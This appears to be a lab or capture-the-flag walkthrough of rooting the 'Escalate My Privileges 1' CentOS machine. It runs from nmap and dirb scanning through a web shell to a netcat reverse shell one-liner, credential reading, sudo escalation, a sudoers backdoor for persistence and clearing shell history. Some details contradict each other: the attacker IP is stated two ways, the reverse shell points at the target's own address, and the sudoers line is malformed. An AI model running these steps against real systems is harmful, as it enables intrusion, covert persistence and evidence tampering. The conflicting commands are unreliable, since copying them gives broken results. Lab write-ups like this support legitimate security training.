# System Hacking Walkthrough: Escalate My Privileges 1
Privilege Escalation lab task using Kali Linux for cybersecurity learning.

## Target Information
* **Hostname:** my_privilege
* **Target IP:** 192.168.56.104
* **Operating System:** CentOS Linux 7 (Core)
* **Attacker IP:** 192.168.56.101

---

## Stage 1: Reconnaissance
This stage involves gathering information about the target, such as IP addresses.

* **Host Discovery:** The `netdiscover` command was used as a fast, ARP-based network discovery tool to find live hosts and their MAC addresses on the local LAN.
* **Attacker IP Check:** The `ifconfig` command was used to identify the attacker's IP address as 192.168.56.104.
* **Ping Scan:** The command `nmap -sn 192.168.56.0/24` was executed to perform host discovery without probing ports.

## Stage 2: Scanning
This stage uses tools to scan the target network for open ports, services, and known vulnerabilities.

* **Port Scanning:** The command `nmap -sC -sV -Pn -vv 192.168.56.104` was utilized.
    * `-sC`: Runs default Nmap Scripting Engine (NSE) scripts for initial reconnaissance.
    * `-sV`: Probes open ports to try to identify the service name and version string.
    * `-Pn`: Skips host discovery, which is useful when ping is blocked.
    * `-vv`: Sets output to very verbose to show more detail about what Nmap is doing.
* **Nmap Results:** Open ports discovered include 22/tcp (OpenSSH 7.4), 80/tcp (Apache httpd 2.4.6), 111/tcp (rpcbind), and 2049/tcp (nfs_acl).
* **Web Directory Enumeration:** `dirb http://192.168.56.104 ~/Desktop/wordlist.txt -X.php,.html,.txt` was used to find hidden web directories and files.
* **Initial Clues:** The scan revealed interesting paths like `/phpbash.php` and `/robots.txt`. Additionally, `/readme.txt` contained a hint: "Find Armour User backup in /backup".

## Stage 3: Gaining Access
This stage focuses on exploiting a vulnerability to gain initial entry into the system.

* **Web Shell Access:** The `/phpbash.php` file provided system access as the `apache` user.
* **Reverse Shell (Netcat):** Netcat was used to pipe a shell over the network.
    * A verbose listener was set up on the attacker machine on port 5555 without DNS lookups using `nc -nlvp 5555`.
    * The payload `bash -i >& /dev/tcp/192.168.56.104/5555 0>&1` was sent from the victim system.
* **Finding Credentials:** Inside the system, a `Credentials.txt` file was read using the `cat` command. 
* **Password Decryption:** The file contained the text `md5(rootroot1)`. The command `echo -n 'rootroot1' | md5sum` generated the hash `b7bc8489abe360486b4b19dbc242e885`.


## Stage 4: Escalate Privileges
This stage involves escalating from a regular user to an admin to get more permission.

* **Switching Users:** Upgraded from the `apache` user to `armour` by running `su armour` and providing the cracked hash password `b7bc8489abe360486b4b19dbc242e885`.
* **The TTY Error:** Usually, reverse or bind shells are shells with limited interactive capabilities. They have no job control, no auto-completion, and limited command support. Because of this, attempting to elevate privileges directly with `sudo su`  returned an error: `sudo: sorry, you must have a tty to run sudo`.
* **Spawning a TTY:** To bypass this restriction and obtain a fully interactive shell, the command `SHELL=/bin/bash script -q /dev/null` was executed. 
* **Checking Sudo Rights:** With a proper TTY established, the `sudo -l` command was used. It checks what administrative (root-level) actions you can execute without entering another user's password.
* **Getting Root:** Root access was successfully obtained using the `sudo bash` command.
* **Capture the Flag:** Navigated to the `/root` directory and read the `proof.txt` file, revealing the final flag `628435356e49f976bab2c04948d22fe4`.

## Stage 5: Maintain Access
This stage ensures you stay connected to the system for long-term access, to allow future control.

* **Passwordless Sudo:** A script named `backup.sh` was created to grant the user `armour` passwordless sudo access.
* **Execution:** The command used was `echo "echo 'armour ALL (ALL) NOPASSWD: ALL' >> /etc/sudoers" > backup.sh`. This appends a NOPASSWD sudoers line to `/etc/sudoers`, the configuration file that controls who can run commands as root.
* **Persistence:** Once the script was executed, the command `sudo su` allowed immediate elevation to root without needing to check `sudo -l`.

## Stage 6: Clear Tracks
This final stage is necessary to clear tracks in the system logs.

* **Review History:** The `history` command was used to view the list of executed commands.
* **Clear Session Logs:** Running `history -c` cleared the command history for that session.
